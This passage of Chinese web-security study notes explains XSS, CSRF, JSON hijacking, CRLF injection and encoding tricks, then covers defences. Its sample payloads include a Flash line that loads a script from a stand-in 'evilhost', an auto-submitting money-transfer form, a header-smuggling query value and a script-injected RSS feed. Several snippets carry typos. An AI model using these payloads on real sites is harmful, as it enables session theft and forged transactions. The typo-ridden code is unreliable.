var xss:String = "function(){alert('xss');}";

ExternalInterface.call(xss);

(3)使用XML格式

```html
import flash.external.ExternalInterface;
var myJavaScript:XML =
<script>
    <![CDATA[
		function(){
			function xss(){
				alert("xss");
				};
			xss;
		}
	]]>
</script>
ExternalInterface.call(myJavaScript);
```

(4)调用外部javascript

```
var fun ="var x=document.creatElement(\"SCRIPT\")";x.src=\"http://evilhost/xss.js\";
x.defer=true;document.getElementsByTagName(\"HEAD\")[0].appendChild(x);";
flash.external.ExternalInterface.call("eval",fun);
```

## 2.13 利用Flash进行csrf

allowNetWorking设置不当会导致csrf

![allowNetWorking](E:\笔记软件\笔记\从零开始的web安全\allowNetWorking.png)

要使用flash进行csrf该属性必须设置all或者internal

## 2.14 深入XSS原理

### 2.14.1 csrf简析

**原理剖析**

1.编写web应用程序存在漏洞导致被恶意利用

2.web浏览器对cookie和http身份验证等会话信息的处理存在一定缺陷

```html
假设存在如下表单
<form action="transfer.php" meyhod="POST">
    账号:<input type="text" name="tobankid"/></br>
    密码:<input type="text" name="money"/></br>
<input type="submit" value="提交" />
</form>
```

用户输入账号和金额就能转账，攻击者构造特殊的url并诱导其点击，由于用户在本地已经保留cookie,用户会直接完成转账

```html
改用post方式发送
<form id="test" method="post" action="url">
<input name="tobankid" value="99">
<input name="money" value="1000">
<input type="submit" value="提交" />
</form>
<script>
test.submit();
</script>
```

![csrfstyle](E:\笔记软件\笔记\从零开始的web安全\csrfstyle.png)

iGaming CMS中存在csrf通过post方式添加管理员的操作；可通过抓取添加用户的数据包构造exp，当管理员cookie存在时访问恶意链接即可创建新管理员；

### 2.14.2 Hacking JSON

**json概述**

json 是存储和交换文本信息的一种语法，json是javascript的子集，格式为“名/值对”

```
"name":"xxxx"
值可以是以下数据类型：
数字（整数或浮点数）
字符串（在双引号中）
逻辑值（true或者是false）
数组（在方括号中）
对象（在花括号中）
```

```json
//对象在花括号中书写
var myJSon ={
	"firstname" : "xxx"
	"lastname"	: "xxx"
doucument.write(myJSon.firstname); //输出xxx
doucument.write(myjson.lastname); //输出xxx
}
//数组在方括号中书写，数组中可有多个对象
var user =[
{"firstname":"xxx","lastname":"xxx"}
{"firstname":"xxx","lastname":"xxx"}
{"firstname":"xxx","lastname":"xxx"}
]
//访问jascript对象数组中的第一项
user[0].lastname;
//xxx
```

**json应用**

```html
假设一个test.json文件内容
var test={"name":"xss"}
只用在标签中引入该文件
<script  src="test.json"></script>
<script>
alert(test.name);
alert(test.length);
</script>
浏览器可通过XMLHttpRequest获取json文本的数据，然后通过eval转换为有用的数据结构
httpRequest =getHttpRequest()//创建对象
//get test.json
var test= eval(httpRequest.responseText)
alert(test.name);
```

**json注入**

```
假设用户能修改用户信息，伪造攻击脚本
name:<img src=javascript:alert(xss)>
服务器有json格式
var user={"name":"$name"}
当用户打开恶意地址
var user={"name":"<img src=javascript:alert(xss)>"}
```

通过ajax技术处理json数据的方式称为”回调法“；json数据文件加载完后都会调用一个特别的函数，并以json数据作为参数；

某些服务能让用户指定调用函数的名字；用户可以通过url改变函数名；

例如要访问id为10的profile,只需发送

```
http://xxxx.com/Getprofile.html?callback=profileCallback&id=10
```

**json hijacking**

该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取数据；

通过该漏洞，攻击者可以绕过web浏览器中使用的同源策略；窃取数据；

流程：用户在保存信任站点的cookie访问恶意站点，浏览器向信任站点发出请求，信任站点识别cookie返回json数据到恶意站点；

###  2.14.3 HTTP Response Splitting

HTTP响应拆分也被称为crlf注射攻击，用户能随意添加额外的http报头信息到http数据包中，然后通过自定义http头创造任意的内容返回用户浏览器中；

**HTTP Header**

随便抓个包来看一下；

```
请求包
GET / HTTP/1.1
Host: uu2fu3o.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```
响应包
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 05 Apr 2023 12:55:47 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Content-Length: 29383
```

**CRLF injection原理**

已知httpheader每一行由\r\n或者"CR"(回车) , "LF"(换行)分割,当用户提交包含"\r\n"的数据时，如果没有进行过滤而这届返回给http header，攻击者就能设置任意的http头，或者直接修改http response的内容；

```
假设有如下代码
<%
nameValueCollection request =Request.QueryString;
Response.Cookies["username"].Value = request["text"];
%>
该代码通过请求test来设置cookie值；
正常情况下访问http://xxx.com/demo.aspx?text=xxx
响应头应为
Set-Cookie: username=xxx
假设没有进行过滤，传递?text=xxx%0D%0ASet-Cookie%3A%20Hackercookie=hacker
就会得到
Set-Cookie: username=xxx
Set-Cookie: Hackercookie=hacker
```

不仅是添加cookie,还能够插入html/javascript代码并执行；

### 2.14.4 MHTML协议安全

[参考](https://github.com/80vul/webzine/blob/master/webzine_0x05/0x05%20IE%25CF%25C2MHTML%D0%AD%25D2%25E9%25B4%25F8%25C0%25B4%25B5%C4%BF%25E7%25D3%25F2%CE%A3%25BA%25A6.html)

### 2.14.5 利用Data URIs进行xss

URL是URI常用协议的一个子集，URI用于指定一个协议用来接收信息，如果额外信息是一个地址，那么URI就等同于URL；

Data uri则是由RFC 2397定义的一种把小文件嵌入文档的方案

```
格式：data:[<mime type>][;charset=<charset>][;base64],<encoded data>
```

![data uri](E:\笔记软件\笔记\从零开始的web安全\data uri.png)

Data可以让用户把文件嵌入其他文件中

**Data uris xss**

data uri提供了一个在HTML或者CSS文件中嵌入图片的方法，但没有严格指定类型，我们可以在base64后嵌入任何类型的文件，甚至是html代码；

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">test<a>
    base64编码内容为<script>alert("xss")</script>
可使用object标签，不需要用户点击即可弹窗
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></object>
```

### 2.14.6 UTF-7 BOM XSS

![utf-7](E:\笔记软件\笔记\从零开始的web安全\utf-7.png)

如果字符集编码没有在HTTP的content-type头或html中的<meta>标签中定义，某些浏览器会自动猜测字符集编码；

```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
上述为<script>alert(document.cookie)</script>转换为utf-7编码；
向浏览器发送一个get请求
http://server/+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
//某些浏览器(
```

### 2.14.7 浏览器插件安全

**flash后门**

```
 .\mtasc.exe -swf test.swf -main -header 1:1:1 test.as
```

```
class test {
function test(){
}
static function main(mc){
getURL("javascript:alert('xss')");
}
}
编写如下as文件，再使用mtasc编译，用户可以把swf文件上传到任意网站并且使用<object><embed>对其进行调用来执行弹窗
```

![flash](E:\笔记软件\笔记\从零开始的web安全\flash.png)

**来自pdf的xss**

pdf文档之所以不安全，是因为其本身支持javascript脚本语言的特性；

可通过较早版本的adobe reader进行xss代码的注入；这里不再多提

![pdfxss](E:\笔记软件\笔记\从零开始的web安全\pdfxss.png)

该漏洞只影响7.0及以下版本；

**quick time xss**

该漏洞利用QuickTime播放器的不安全特色Text Tracks

### 2.14.8 特殊XSS应用场景

**基于cookie的xss**

该漏洞由于对cookie中的参数过滤不言，导致攻击者能够在cookie中插入跨站代码；

**来自RSS的XSS**

如何执行此类攻击，只需要修改XML文件中的RSS数据，在一些字段中加入恶意代码即可;

```xml
<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:cc="http://web.resource.org/cc/" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:media="http://search.yahoo.com/mrss/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <channel>
    <atom:link href="http://dataskeptic.libsyn.com/rss" rel="self" type="application/rss+xml"/>
    <title>Data Skeptic</title>
    <pubDate>Fri, 15 Jan 2016 15:00:00 +0000</pubDate>
    <lastBuildDate>Fri, 15 Jan 2016 15:08:58 +0000</lastBuildDate>
    <generator>Libsyn WebEngine 2.0</generator>
    <link>http://dataskeptic.com</link>
    <language>en</language>
    <copyright><![CDATA[Creative Commons Attribution License 3.0]]></copyright>
    <docs>http://dataskeptic.com</docs>
    <managingEditor>kylepolich@gmail.com (kylepolich@gmail.com)</managingEditor>
    <itunes:summary><![CDATA[The Data Skeptic Podcast features interviews and discussion of topics related to data science, statistics, machine learning, artificial intelligence and the like, all from the perspective of applying critical thinking and the scientific method to evaluate the veracity of claims and efficacy of approaches.]]></itunes:summary>
    <image>
      <url>http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg</url>
      <title>Data Skeptic</title>
      <link><![CDATA[http://dataskeptic.com]]></link>
    </image>
    <itunes:author>Kyle Polich</itunes:author>
    <itunes:keywords>datamining,datascience,machinelearning,science,skepticism,statistics</itunes:keywords>
  <itunes:category text="Science &amp; Medicine"/>
  <itunes:category text="Technology"/>
  <itunes:category text="Education">
    <itunes:category text="Higher Education"/>
  </itunes:category>
    <itunes:image href="http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg" />
    <itunes:explicit>clean</itunes:explicit>
    <itunes:owner>
      <itunes:name><![CDATA[Kyle Polich]]></itunes:name>
      <itunes:email>kylepolich@gmail.com</itunes:email>
    </itunes:owner>
    <description><![CDATA[Data Skeptic alternates between short mini episodes with the host explaining concepts from data science to his non-data scientist wife, and longer interviews featuring practitioners and experts on interesting topics related to data, all through the eye of scientific skepticism.]]></description>
    <itunes:subtitle><![CDATA[Applying critical thinking to Data Science]]></itunes:subtitle>
      <item>
      <title><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></title>
      <pubDate>Fri, 15 Jan 2016 15:00:00 +0000</pubDate>
      <guid isPermaLink="false"><![CDATA[18102dbc685d36dea2556055eea4ed76]]></guid>
      <link><![CDATA[javascript:alert(document.domain)]]></link>
      <itunes:image href="http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg" />
      <description><![CDATA[<script>alert(2)</script>]]></description>
      <enclosure length="45125402" type="audio/mpeg" url="http://traffic.libsyn.com/dataskeptic/pseudo-profound-episode.mp3" />
      <itunes:duration>37:37</itunes:duration>
      <itunes:explicit>no</itunes:explicit>
      <itunes:keywords />
      <itunes:subtitle><![CDATA[A recent paper in the journal of Judgment and Decision Making titled On the reception and detection of pseudo-profound bullshit explores empirical questions around a reader's ability to detect statements which may sound profound but are actually a...]]></itunes:subtitle>
          </item>
  </channel>
</rss>
```

这是一份已经注入javascript代码的xml文件，只需要把它上传到服务器，然后使用rss阅读器订阅此地址便可触发xss

[文件源](https://gist.github.com/fyoorer/6ea27a449ae6249e519a)

**应用软件中的xss**

 危害主要来自于，应用程序对用户的输入没有进行严格的过滤，例如邮箱等软件导致能够执行XSS；

### 2.14.9 浏览器差异

**跨浏览器的不兼容性**

造成不兼容现象的主要原因是DOM和CSS

**IE嗅探机制与XSS**

 ie浏览器会对页面通过content-type: text/html进行嗅探，如果是html页面就会正常加载，firefox 和chorme就不会，因此我们可以利用该特性，在txt文本中保存含有XSS的html代码,使用IE浏览器就能正常弹窗

**浏览器差异造成的XSS**

本质在于利用浏览器的特性来设置XSSpayload

例如chrome 会动态修正一些节点

```
</script x\> --> </script>
```

### 2.14.10 字符集编码隐患

双字节编码漏洞，主要利用php对'的转义，当php设置了GBK等宽字节字符集的时候，高8位合并编码为汉字；

```
假设有如下代码
<?php
header("Content-Type:text/html;Charset=gb2312");
$a=$_GET["a"];
>
<script>x='<?php echo $a;?>';y='[user_input]';
</script>
```

如果php设置了CBK，我们就可以利用转义来进行XSS；

```
假设我们传入
?a=xss';aler(0)//
返回内容为
<script>x='xss\';alert(0)//;?>'.....
显然这里被转义，无法执行，换种传入方式
?a=xss%5d';alert(0)//
返回如下
<script>x='xss诚';alert(0)//';y='[user_input]';
能够执行弹窗
```

## 2.15 防御XSS

### 2.15.1 XSS Filter

**输入过滤**

(1)输入验证

设定长度

设定只允许输入的字符

利用javascript进行校验输入是否正确

输入是否符合格式要求

(2)数据消毒

服务端处理，拒绝敏感字符如< > ' "  & # javascript expression等

**输出编码**

大多数应用存在将用户输入直接输出在页面上的习惯，这样很容易造成XSS

如果要输出在页面上，最好是对敏感字符使用htmlencode进行编码

### 2.15.2 黑名单和白名单

![blackwhitelist](E:\笔记软件\笔记\从零开始的web安全\blackwhitelist.png)

如果仅仅是使用黑名单，攻击者可以通过之前讲到的方式转码，混淆进行攻击，所以还需要白名单，单从程度上来讲，对信息过滤白名单会优于黑名单；

### 2.15.3 字符转码

对关键字符，标签进行实体编码，特别需要注意的是url属性与javascript事件；

### 2.15.4 防御dom-based-xss

由于dom并不经过服务端，所以一切基于服务端的过滤都是无效的；

要防御dom-xss,要注意以下几点

(1)避免客户端的文档重写，重定向，避免使用客户端数据，这些操作尽量在服务端动态实现

(2)分析和强化客户端javascript代码，尤其是一些受到用户影响的dom对象；

```
从URL获取
document.URL
document.URLUnencoded
document.location(.pathname|.href|.search|.hash)
window.location(.pathname|.href|.search|.hash)
Referre属性
document.referrer
windowname属性
window.name
其他属性 
document.cookie
HTML5 postMessage
localStorage/globalStorage
XMLHTTPRequest response
Input.value
```

### 2.15.5 其他防御方式

**Anti-xss**

一个专门防范XSS的库；

**httponly cookie**

支持Cookie的浏览器最好是设置httponly cookie

**Noscript**

一款免费的浏览器插件，默认进禁止所有脚本，可自定义能够运行的脚本；

**WAF**

## 2.16 防御CSRF

使用post代替get;

检验http referer

验证码

使用token

## 参考资料

《XSS跨站脚本攻击剖析与防御》

https://www.w3school.com.cn/js/js_htmldom.asp

https://gist.github.com/fyoorer/6ea27a449ae6249e519a

## 后记

写的很烂，内容不丰富，有问题请指出
